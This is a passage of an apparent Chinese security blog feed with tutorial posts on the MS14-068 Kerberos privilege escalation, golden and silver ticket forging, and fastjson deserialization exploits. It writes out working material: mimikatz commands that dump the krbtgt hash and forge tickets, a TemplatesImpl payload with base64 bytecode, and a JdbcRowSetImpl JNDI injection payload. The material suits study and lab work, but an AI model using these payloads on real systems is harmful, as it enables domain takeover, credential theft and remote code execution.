SID）进行MD5加密得到<code>MD5值</code>作为签名,这里就是微软的第一个错误：</p><p><strong>在KDC机构对PAC进行验证时,对于PAC尾部的签名算法,虽然原理上规定必须是带有Key的签名算法才可以,但微软在实现上,却允许任意签名算法,只要客户端指定任意签名算法,KDC服务器就会使用指定的算法进行签名验证.</strong></p><p>同时我们在客户端生成一个随机数<code>subkey</code>,用这个随机数对PAC进行加密,这个subkey会被放到TGS_REQ的<code>Authenticator</code>中,同时我们要发送的TGS_REQ中还包含<code>低权限用户的TGT</code>和<code>我们之前构造的PAC</code>,但这个PAC并不在TGT里面而是在外面</p><p><img src="image-20230416152934190.png" alt="image-20230416152934190"></p><p>此时发送我们所构造的恶意的TGS-REQ,这里微软犯了第二个错：</p><p><strong>PAC没有被放在TGT中,而是放在了TGS_REQ数据包的其它地方.但可笑的是,KDC在实现上竟然允许这样的构造,也就是说,KDC能够正确解析出没有放在其它地方的PAC信息.</strong></p><p>意味着我们所构造的PAC是可以被解析的,配合微软的第三个错：</p><p><strong>KDC验证缺少PAC的TGT成功后,再验证不在TGT中 的PAC的合法性.如果2个均验证成功,KDC把PAC中的User  SID、Group  SID取出来,重新使用进行签名,签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样.将将新产生的PAC加入到解密后的TGT中,再重新加密制作全新的TGT发送给Client,不是TGS</strong></p><p>最后就会返回一个<code>高权限用户的TGT</code></p><p><img src="image-20230416153252369.png" alt="image-20230416153252369"></p><p>到这里我们就已经将原理分析清楚了,接下来谈谈它的利用</p><h2 id="利用">利用</h2><p>首先下载<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068.exe</a></p><p>查看补丁信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">或者</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>得到当前用户的sid</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure><p>使用MS14-068.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br></pre></td></tr></table></figure><p>成功以后会生成一个ccache文件</p><p>使用mimikatz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge#清除原有票据</span><br><span class="line">kerberos::ptc C:\XXXX.ccache#将管理员证书写入</span><br></pre></td></tr></table></figure><p>详细的漏洞复现网上有一大堆,可以参考这篇文章：<a href="https://www.cnblogs.com/yuzly/p/10859520.html">MS14-068域提权漏洞复现</a></p><p>更详细的原理分析可以参考：<a href="https://blog.csdn.net/zy_strive_2012/article/details/51698780">ms14-068的深入分析</a></p><h1 id="黄金票据">黄金票据</h1><p><code>黄金票据（Golden  Ticket）</code>指黑客通过窃取Kerberos域控制器（KDC）的<code>krbtgt帐号的密码哈希值</code>,生成伪造的<code>票据（TGT）</code>来获取对整个Kerberos领域的完全访问权限的过程.这种攻击方式被称为“黄金”票据,因为它赋予了攻击者类似于使用黄金密钥一样的特权来绕过Kerberos的身份验证和授权机制,从而可以自由地访问所有资源,并且很难被检测到和防止.</p><p>由于TGT部分是利用<code>krbtgt帐号的密码哈希</code>来加密的,KDC验证TGT是否有效也是用krbtgt帐号的密码哈希来解密,如果我们知道了krbtgt帐号的密码哈希,就可以自己伪造一个TGT了,而一般要得到krbtgt的密码哈希都是通过域控来拿的,所以黄金票据适合用来做<code>权限维持</code></p><p>利用条件：<code>域名</code>、<code>域的sid</code>、<code>域的KRBTGT账户NTLM密码哈希</code>、<code>伪造对象用户名</code></p><p>获取域名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>获取sid：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>获取域的KRBTGT账户NTLM密码哈希或者aes-256值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xx.com /user:krbtgt /csv</span><br></pre></td></tr></table></figure><p>查看域管理员用户名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p>使用mimikatz</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br><span class="line"><span class="attr">kerberos</span>::golden  /<span class="attr">admin</span>:administrator  /<span class="attr">domain</span>:xx.<span class="property">com</span>  /<span class="attr">sid</span>:xxxx /<span class="attr">krbtgt</span>:xxxx  /ptt</span><br></pre></td></tr></table></figure><p>参考：<a href="https://cloud.tencent.com/developer/article/2130133">一文了解黄金票据和白银票据</a></p><h1 id="白银票据">白银票据</h1><p><code>白银票据（Silver  Ticket）</code>指黑客通过窃取目标主机上的<code>服务账号的密码哈希值</code>,生成伪造的<code>服务票据（ST）</code>来获取对该主机上特定服务的访问权限.这种攻击方式被称为“白银”票据,因为它不像“黄金”票据那样具有完全的控制权限,只能用于访问特定的服务,并且难以被检测到和防止.</p><p>与TGT类似,ST（Service Ticket）通过<code>服务账户的密码哈希</code>进行加密,如果我们知道了对应服务账户的密码哈希,我们就可以伪造该相关服务的ST,从而访问到该服务</p><p>实操可参考：<a href="https://cloud.tencent.com/developer/article/1760135">白银票据（Silver Ticket）攻击</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MS14-068&quot;&gt;MS14-068&lt;/h1&gt;
&lt;p&gt;MS14-068 是微软在 2014 年 11 月发布的一个安全公告,其中提到了 Windows 操作系统中存在的一个漏洞,对应的补丁号是&lt;code&gt;KB3011780&lt;/code&gt;.该漏洞被称为 Kerber</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="维权" scheme="http://example.com/tags/%E7%BB%B4%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之fastjson</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/</id>
    <published>2023-04-10T12:23:14.000Z</published>
    <updated>2023-06-14T11:56:11.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJson-1-2-22-1-2-24">FastJson 1.2.22 - 1.2.24</h1><p><code>fastjson</code>是java反序列化中一个经典的漏洞了,早些在使用java写爬虫程序的时候就用过这个库,今天就针对其反序列化漏洞再来学习一次。</p><p>首先先介绍一下JavaBean ，<code>JavaBean</code> 包括一个默认的<code>构造函数</code>、<code>私有的成员变量</code>以及<code>公共的 getter 和 setter 方法</code>。这些方法用于对类中的属性进行读取和赋值操作,并且可以通过反射机制对其进行访问。</p><p>JavaBean 类通常被用作数据传输对象（DTO）或持久化对象（POJO）,并且经常与 Web 应用程序框架（如 Spring MVC）一起使用。通过将数据映射到 JavaBean 对象中,我们可以方便地进行数据绑定、表单验证以及数据库访问等操作。</p><p>以下是一个简单的 JavaBean 类示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName被调用了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName被调用了&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTEST</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">21</span>,<span class="string">&quot;1y0ng&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(stringobject);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> JSON.parseObject(stringobject,Person.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="image-20230410210446299.png" alt="image-20230410210446299"></p><p>可见在fastjson在序列化的时候会调用JavaBean对象中对应参数的<code>get方法</code>,而在反序列化的时候会调用相应的<code>set方法</code>（要指定反序列化对象）,但我们如何选择反序列化后生成对象是谁呢？</p><p>fastjson给了我们一个<code>@type</code>用来指定反序列化后生成的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;:\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure><p><img src="image-20230410215040668.png" alt="image-20230410215040668"></p><blockquote><p>注:这里如果只是以下函数是不会触发get和set方法的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:21,\&quot;name\&quot;:\&quot;1y0ng\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(stringobject));</span><br></pre></td></tr></table></figure></blockquote><h2 id="结合cc3">结合cc3</h2><p>之前在学cc3和shiro的CB链的时候用到了<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>,刚好这就是get方法,所以我们这里这里可以试试这种方法的利用</p><p>首先将字节数组以<code>base64字符串</code>的形式输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\php_project\\shengji_study\\target\\classes\\runtime.class&quot;</span>));</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(codes));</span><br></pre></td></tr></table></figure><p>然后放入到json字符串中得到poc：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMcnVudGltZTsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAxydW50aW1lLmphdmEMAAkACgcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAHcnVudGltZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFQANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAMAAkADwAMAA0ADQAOABEAEAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxx&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">stringobject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66v……;</span></span><br><span class="line"><span class="string">JSON.parseObject(stringobject,Feature.SupportNonPublicField);</span></span><br></pre></td></tr></table></figure><p><img src="image-20230410223538055.png" alt="image-20230410223538055"></p><p>其中,<code>Feature.SupportNonPublicField</code> 是 Fastjson 库中的一个选项,用于控制是否支持序列化和反序列化非公共字段。如果将该选项设置为 <code>true</code>,则 Fastjson 将尝试序列化和反序列化所有字段,包括私有字段和受保护字段。由于这里TemplatesImpl类的属性全都是private,所以需要设置第二个参数为<code>Feature.SupportNonPublicField</code></p><p>​</p><h2 id="基于JdbcRowSetImpl的jndi注入">基于JdbcRowSetImpl的jndi注入</h2><p>要想利用cc3有很多的局限性,所以我们还可以通过jndi注入执行命令</p><p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类为我们提供了条件,其中的<code>connect()</code>方法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">    <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect using JNDI.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup<span class="comment">//这里可以尝试jndi注入</span></span><br><span class="line">                (getDataSourceName());</span><br><span class="line">            <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; !getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">        <span class="comment">// user, passwd can be null</span></span><br><span class="line">        <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">                (getUrl(), getUsername(), getPassword());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来发现connect()方法被<code>setAutoCommit方法</code>调用了</p><p><img src="image-20230411161822971.png" alt="image-20230411161822971"></p><p><img src="image-20230411195545182.png" alt="image-20230411195545182"></p><p>这里刚好是一个set方法,可以被fastjson反序列化调用</p><p>这里推荐一个工具——<a href="https://www.yaklang.io">yakit</a></p><p>开启反连服务器</p><p><img src="image-20230411163548141.png" alt="image-20230411163548141"></p><p>设置JavaPayLoad</p><p><img src="image-20230411163755158.png" alt="image-20230411163755158"></p><p>构造poc（网上有人说这里autoCommit必须为true,但我测试下来true和false都可以）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8085/hDEqCUyW&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>命令执行成功<img src="image-20230411163909090.png" alt="image-20230411163909090"></p><h1 id="FastJson-1-2-47">FastJson &lt;1.2.47</h1><p>在1.2.24版本之后,fastjson引入了一个<code>checkAutotype函数</code>,通过黑白名单的方式来检查反序列化是否安全,如果能正常返回clazz的话就会加载并实例化clazz类</p><p><img src="image-20230411174550334.png" alt="image-20230411174550334"></p><p>判断的流程有些复杂,但还是存在可以绕过的情况。在checkAutotype函数中首先会进行一个黑白名单判断,如果传入的类既不在白名单里又不在黑名单里,那么就会对缓存中存在的类进行判断,如果能够在缓存中找到这个类,就返回这个类的clazz,主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;<span class="comment">//白名单判断</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;<span class="comment">//黑名单判断</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//从缓存表中查找类名</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;<span class="comment">//在这里就直接返回了clazz</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看<code>getClassFromMapping</code>方法,在<code>com.alibaba.fastjson.util.TypeUtils</code>类中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);<span class="comment">//可以发现获取的是mappings参数的类名</span></span><br><span 